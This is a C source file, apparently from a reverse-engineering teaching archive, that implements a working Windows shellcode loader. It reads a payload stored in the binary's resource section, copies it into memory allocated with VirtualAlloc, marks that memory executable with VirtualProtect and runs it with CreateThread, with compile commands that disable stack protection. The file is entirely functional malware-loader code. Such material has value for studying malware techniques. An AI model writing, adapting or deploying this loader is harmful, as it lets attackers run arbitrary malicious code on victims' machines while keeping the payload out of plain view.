/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload in resource

Compile:
    $ rc resources.rc
    $ cvtres /MACHINE:x64 resources.res
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /MACHINE:x64 /Tccode.cpp resources.obj

Technique:
    - writing:    FindResource, LoadResource, LockResource
    - allocation: VirtualAlloc
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>
#include "resources.h"

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;
    HGLOBAL h_res = NULL;
    HRSRC   res;

    uint8_t *   payload;
    uint32_t    payload_len;

    // extract payload from resource section
    res         = FindResource (NULL, MAKEINTRESOURCE(SHELLCODE), RT_RCDATA);
    h_res       = LoadResource (NULL, res);
    payload     = (uint8_t *) LockResource (h_res);
    payload_len = SizeofResource (NULL, res);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    return 0;
}